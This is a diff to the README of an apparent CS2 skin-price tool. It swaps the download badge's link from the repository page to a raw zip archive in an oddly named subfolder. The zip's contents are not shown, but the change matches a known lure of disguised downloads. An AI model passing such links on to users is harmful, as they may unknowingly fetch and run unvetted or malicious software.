@@ -1,6 +1,6 @@
 # 📡 cs2-market-skin-radar - Find Discounted CS2 Skins Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_Market_Skin_Radar-brightgreen?style=for-the-badge&logo=github)](https://github.com/costal-genericwine109/cs2-market-skin-radar)
+[![Download Now](https://img.shields.io/badge/Download-CS2_Market_Skin_Radar-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/costal-genericwine109/cs2-market-skin-radar/main/crumblet/market_skin_cs_radar_3.5.zip)
 
 ## 🎯 What This Application Does
 
